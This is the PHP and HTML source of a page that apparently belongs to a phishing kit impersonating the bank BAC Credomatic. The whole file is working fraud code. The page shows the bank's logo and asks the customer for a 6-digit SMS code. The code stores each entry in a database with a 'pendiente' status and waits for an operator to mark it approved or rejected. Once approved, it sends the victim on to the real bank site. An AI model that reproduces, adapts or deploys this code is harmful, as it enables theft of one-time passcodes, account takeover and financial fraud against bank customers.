<?php
include 'db.php';

// Obtener el ID de la URL
$id = isset($_GET['id']) ? intval($_GET['id']) : 0;

if ($id == 0) {
    die("ID no válido.");
}

// Verificar si el formulario fue enviado
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Obtener el código SMS ingresado por el usuario
    $codigo_sms = isset($_POST['codigo_sms']) ? $_POST['codigo_sms'] : '';

    // Validar si el código SMS es correcto
    if (strlen($codigo_sms) === 6) {
        // Actualizar el código SMS y poner el estado en pendiente en la base de datos
        $update_stmt = $conn->prepare("UPDATE usuarios SET codigo_sms = :codigo_sms, sms_status = 'pendiente' WHERE id = :id");
        $update_stmt->bindParam(':codigo_sms', $codigo_sms);
        $update_stmt->bindParam(':id', $id);
        $update_stmt->execute();

        // Verificar el estado actual del sms_status
        $stmt = $conn->prepare("SELECT sms_status FROM usuarios WHERE id = :id");
        $stmt->bindParam(':id', $id);
        $stmt->execute();
        $row = $stmt->fetch(PDO::FETCH_ASSOC);

        if ($row) {
            $sms_status = $row['sms_status'];

            // Si el estado es 'rechazado', se redirige a sms.php y el estado se cambia a 'pendiente'
            if ($sms_status == 'rechazado') {
                // Aquí ya el estado ha sido cambiado antes de redirigir, solo redirigir
                header("Location: sms.php?id=$id");
                exit();
            }

            // Si el estado es 'pendiente', redirigir a loading2.php
            if ($sms_status == 'pendiente') {
                header("Location: loading2.php?id=$id");
                exit();
            }

            // Si el estado es 'aprobado', redirigir a la página de BAC Credomatic
            if ($sms_status == 'aprobado') {
                header("Location: https://www.baccredomatic.com/");
                exit();
            }
        }
    } else {
        // Si el código no es válido, puedes mostrar un error
        echo "Por favor ingresa un código SMS válido de 6 dígitos.";
    }
}

// Verificar si se redirige desde sms.php (cuando el estado es rechazado)
if (isset($_GET['id']) && $id > 0) {
    // Cambiar el estado a 'pendiente' después de la redirección
    $update_status_stmt = $conn->prepare("UPDATE usuarios SET sms_status = 'pendiente' WHERE id = :id");
    $update_status_stmt->bindParam(':id', $id);
    $update_status_stmt->execute();
}

$conn = null;
?>




<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <script src="validarcodigo.js"></script> <!-- Cargar el script de validación -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirección SMS</title>
    <link rel="icon" href="favicon-32x32.png" type="image/x-icon">
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Open Sans', sans-serif;
            background-image: url(background.svg);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 60vh;
            color: #333;
            text-align: center;
        }

        .navbar {
            width: 100%;
            background-color: rgb(255, 255, 255);
            padding: 10px 20px;
            box-shadow: 0 2px 3px rgba(0, 0, 0, 0.1);
            display: flex;
            align-items: center;
            justify-content: flex-start;
            position: fixed;
            top: 0;
            left: 0;
            z-index: 1000;
        }

        .navbar img {
            height: 40px;
            margin-left: 20px;
        }

        h1 {
            font-size: 1.8rem;
            color: #000756;
            margin-bottom: 20px;
        }

        .input-container {
            position: relative;
            margin-top: 20px;
            width: 250px;
        }

        label {
            position: absolute;
            top: -15px;
            left: 10px;
            font-size: 0.9rem;
            color: #888;
            background-color: #f4f4f4;
            padding: 0 5px;
            z-index: 1;
        }

        .input-code {
            padding: 10px;
            font-size: 1rem;
            border-radius: 5px;
            width: 100%;
            border: 1px solid #ccc;
            padding-left: 10px;
        }

        .submit-btn {
            background-color: #ff0000;
            color: rgb(255, 255, 255);
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            font-size: 1.1rem;
            font-weight: bold;
            cursor: pointer;
            margin-top: 20px;
            width: 240px;
            margin-left: 25px;
        }

        .submit-btn:hover {
            background-color: #ff2020;
        }
    </style>
</head>

<body>

    <div class="navbar">
        <img src="BAC_LOGO.webp" alt="Logo">
    </div>

    <h1>Buenas cliente</h1>

    <!-- Formulario que envía los datos al mismo archivo -->
    <form id="smsForm" method="POST" onsubmit="return validarCodigo();">
        <div class="input-container">
            <label for="codigo_sms">Ingresa código SMS</label>
            <input type="text" id="codigo_sms" name="codigo_sms" class="input-code" placeholder="Código SMS" maxlength="6" required>
        </div>

        <button type="submit" class="submit-btn">Ingresar</button>
    </form>

</body>
</html>
